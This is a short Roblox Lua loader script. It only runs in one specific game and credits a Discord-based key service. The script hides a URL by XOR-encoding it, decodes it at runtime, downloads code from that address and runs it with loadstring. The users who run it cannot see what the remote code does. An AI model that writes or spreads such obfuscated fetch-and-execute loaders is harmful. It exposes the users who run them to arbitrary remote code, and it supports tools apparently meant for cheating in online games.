if tostring(game.PlaceId) ~= "7871169780" then
    return
end

--[[ 
Protected by Jawir Dukun's 
Key at https://discord.gg/gfqDhjMjtM
]]

( function (...) local _llIIllIlII = "\002\021\003\025\001\085\065\091\029\017\029\079\016\000\006\007\027\022\026\003\015\019\020\006\028\027\011\026\027\094\009\014\026\070\060\014\026\000\014\028\016\078\005\011\030\023\065\006\010\022\025\078\031\012\019\011\029\091\002\017\003\015\088\011\030\000\013\031\010\002\007\000\025\054\020\026\002\024\065\028\031\000" local _IllIIlIIll = "jawirontop" local function _IlIllIlIlI(str, k) local _lIIIIllllI = {} for i = 0x1, #str do local _llIllIIlII = string.byte(str, i) local _lllIllIlII = string.byte(k, ((i - 0x1) % #k) + 0x1) table.insert(_lIIIIllllI, string.char(bit32.bxor(_llIllIIlII, _lllIllIlII))) end
 return table.concat(_lIIIIllllI) end
 local _IllIIIIllI = _IlIllIlIlI(_llIIllIlII, _IllIIlIIll) if not _IllIIIIllI:match("^https://") then return end
 local _lllllIlIll = game:HttpGet(_IllIIIIllI) loadstring(_lllllIlIll)() end
 )(...)
